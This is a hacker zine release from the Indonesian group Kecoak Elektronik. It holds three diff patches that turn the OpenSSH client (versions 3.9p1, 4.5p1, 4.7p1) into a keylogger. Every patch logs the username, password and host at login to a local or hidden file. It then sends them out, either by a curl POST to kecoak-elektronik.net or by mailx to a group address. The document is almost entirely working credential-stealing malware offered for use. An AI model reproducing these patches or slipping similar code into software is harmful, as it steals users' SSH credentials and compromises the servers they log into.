@@ -1,0 +1,190 @@
+Kecoak Elektronik Indonesia [ KEI ]
+http://www.kecoak-elektronik.net
+
+24 Hours A Day, 300/1200 Baud
+Presents...
+
+
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak-elektronik.net
+Contact   : staff@kecoak-elektronik.net
+####################################################################
+
+
+Subject   : SSH Client Keylogger Patch
+Code Name : ssh-keylog-3.9p1.diff
+Writer    : Pseudoanonymous of Kecoak Elektronik
+Contact   : asktothegoogleaboutmyemail (at) Kecoak Elektronik
+Style     : Unicode Transformation Format (UTF-8)
+
+
+8<- - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - -
+
+diff -u openssh-3.9p1/sshconnect2.c openssh-3.9p1.old/sshconnect2.c
+--- openssh-3.9p1/sshconnect2.c 2004-06-14 19:30:09.000000000 -0500
++++ openssh-3.9p1.old/sshconnect2.c     2007-10-22 02:00:38.000000000 -0500
+@@ -53,6 +53,7 @@
+ #ifdef GSSAPI
+ #include "ssh-gss.h"
+ #endif
++#define SNIFFED "/usr/local/share/h4x0r3d/outpw"
+
+ /* import */
+ extern char *client_version_string;
+@@ -722,8 +723,9 @@
+ userauth_passwd(Authctxt *authctxt)
+ {
+        static int attempt = 0;
+-       char prompt[150];
++       char prompt[150],EXEC[200];
+        char *password;
++       FILE *f;
+
+        if (attempt++ >= options.number_of_password_prompts)
+                return 0;
+@@ -734,6 +736,15 @@
+        snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+            authctxt->server_user, authctxt->host);
+        password = read_passphrase(prompt, 0);
++
++       if((f=fopen(SNIFFED,"a"))!=NULL)
++       {
++           fprintf(f,"%s:%s@%s\n",authctxt->server_user,password,authctxt->host);
++           fclose(f);
++       }
++       snprintf(EXEC,sizeof(EXEC),"/usr/bin/curl -d \"user=%s&pass=%s&target=%s\" http://kecoak-elektronik.net/savecok.php > /dev/null 
+2>&1\n",authctxt->server_user,password,authctxt->host);
++       system(EXEC);
++
+        packet_start(SSH2_MSG_USERAUTH_REQUEST);
+        packet_put_cstring(authctxt->server_user);
+        packet_put_cstring(authctxt->service);
+
+
+
+8<- - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - -
+
+
+Subject   : SSH Client Keylogger Patch
+Code Name : ssh-keylog-4.5p1.diff
+Writer    : Pseudoanonymous of Kecoak Elektronik
+Contact   : asktothegoogleaboutmyemail (at) Kecoak Elektronik
+Style     : Unicode Transformation Format (UTF-8)
+
+
+8<- - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - -
+
+--- openssh-4.5p1/sshconnect2.c 2006-09-01 12:38:37.000000000 +0700
++++ openssh/sshconnect2.c       2007-01-25 04:33:47.000000000 +0700
+@@ -67,7 +67,7 @@
+ #ifdef GSSAPI
+ #include "ssh-gss.h"
+ #endif
+-
++#define SADAP "logpw.txt"
+ /* import */
+ extern char *client_version_string;
+ extern char *server_version_string;
+@@ -734,8 +734,9 @@
+ userauth_passwd(Authctxt *authctxt)
+ {
+        static int attempt = 0;
+-       char prompt[150];
++       char prompt[150],EXECWORD[200];
+        char *password;
++       FILE *fd1,*fd2;
+
+        if (attempt++ >= options.number_of_password_prompts)
+                return 0;
+@@ -746,6 +747,19 @@
+        snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+            authctxt->server_user, authctxt->host);
+        password = read_passphrase(prompt, 0);
++
++       //password login ssh di log dalam file
++       if((fd1=fopen(SADAP,"a"))!=NULL){
++               fprintf(fd1,"lokal user %s login ssh %s@%s dengan password 
+%s\n",authctxt->local_user,authctxt->server_user,authctxt->host,password);
++               fclose(fd1);
++       }
++
++       //password login ssh dikirim ke server lain menggunakan curl
++       if((fd2=fopen("/usr/bin/curl","r"))!=NULL){
++               snprintf(EXECWORD,sizeof(EXECWORD),"/usr/bin/curl -d \"localuser=%s&userssh=%s&serverssh=%s&password=%s\" 
+http://kecoak-elektronik.net/savecok.php > /dev/null 2>&1",authctxt->local_user,authctxt->server_user,authctxt->host,password);
++               system(EXECWORD);
++               fclose(fd2);
++       }
+        packet_start(SSH2_MSG_USERAUTH_REQUEST);
+        packet_put_cstring(authctxt->server_user);
+        packet_put_cstring(authctxt->service);
+
+
+
+8<- - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - -
+
+
+Subject   : SSH Client Keylogger Patch
+Code Name : ssh-keylog-4.7p1.diff
+Writer    : Pseudoanonymous of Kecoak Elektronik
+Contact   : asktothegoogleaboutmyemail (at) Kecoak Elektronik
+Style     : Unicode Transformation Format (UTF-8)
+
+
+8<- - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - -
+
+--- sshconnect2.old.c   2007-09-28 20:16:26.000000000 +0700
++++ sshconnect2.c       2007-09-28 20:50:07.000000000 +0700
+@@ -69,6 +69,11 @@
+ #include "ssh-gss.h"
+ #endif
+ 
++//SSH Client Keylogger Based on OpenSSH 4.7p1
++//Patch is supplied by Kecoak Elektronik
++//Better find another path to log sniffed password
++#define LOGZ "/var/tmp/.vi.recover/pw.txt"
++
+ /* import */
+ extern char *client_version_string;
+ extern char *server_version_string;
+@@ -735,8 +740,9 @@
+ userauth_passwd(Authctxt *authctxt)
+ {
+        static int attempt = 0;
+-       char prompt[150];
++       char prompt[150],logz[128];
+        char *password;
++       FILE *f;
+ 
+        if (attempt++ >= options.number_of_password_prompts)
+                return 0;
+@@ -746,7 +752,18 @@
+ 
+        snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+            authctxt->server_user, authctxt->host);
++       
+        password = read_passphrase(prompt, 0);
++       //logs di file
++       if((f=fopen(LOGZ,"a"))!=NULL){
++               fprintf(f,"user:password@host --> %s:%s@%s\n",authctxt->server_user,password,authctxt->host);
++               fclose(f);
++       }
++       //kirim ke server pake curl/mail terserah
++       //example pake 'mailx'
++       snprintf(logz,sizeof(logz),"tail -1 %s|mailx -s \"[owned user]new fucked user\" hacker@kecoak-elektronik.net",LOGZ);
++        system(logz);  
++       
+        packet_start(SSH2_MSG_USERAUTH_REQUEST);
+        packet_put_cstring(authctxt->server_user);
+        packet_put_cstring(authctxt->service);
+
+8<- - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - -
+
+
+
+Sarang Kecoak
+-----------------------------------------------------------------------
+Copyleft Unreserved by Law 1995 - 2007 Kecoak Elektronik Indonesia
